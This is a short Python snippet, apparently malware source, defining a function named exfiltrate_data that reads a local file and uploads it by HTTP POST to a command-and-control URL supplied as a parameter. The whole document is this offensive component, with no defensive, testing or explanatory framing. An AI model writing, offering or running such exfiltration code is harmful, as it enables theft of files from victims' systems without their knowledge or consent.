import os
import requests

def exfiltrate_data(file_path, c2_url):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(c2_url, files=files)
    return response.status_code
